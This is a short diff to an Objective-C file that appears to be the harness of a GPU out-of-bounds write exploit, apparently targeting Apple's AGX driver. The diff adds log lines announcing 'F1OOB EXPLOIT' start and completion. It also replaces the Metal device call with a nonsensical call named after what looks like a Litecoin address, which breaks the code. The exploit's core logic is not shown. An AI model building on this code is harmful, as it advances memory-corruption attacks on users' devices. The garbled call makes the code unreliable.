@@ -182,7 +182,7 @@ static int test_cross_object_write(void) {
     uint64_t f1_gpu_va = agx_map_surface(surface_id, &span, &agx_conn);
     if (!f1_gpu_va) return -1;
     
-    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    id<MTLDevice> dev = ltc1qalrd99hju33uagsf8927k7xfxr423gr93gnjz8();
     if (!dev) {
         NSLog(@"[ERROR] No Metal device");
         return -1;
@@ -285,6 +285,8 @@ static int test_cross_object_write(void) {
 
 int main(int argc, char *argv[]) {
     @autoreleasepool {
+        NSLog(@"=== F1OOB EXPLOIT STARTING ===");
+        
         int result = test_cross_object_write();
         
         NSString *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES)[0];
@@ -302,6 +304,7 @@ int main(int argc, char *argv[]) {
         
         [log writeToFile:logPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
         NSLog(@"[OK] Log written to: %@", logPath);
+        NSLog(@"=== F1OOB EXPLOIT COMPLETE ===");
         
         return result;
     }
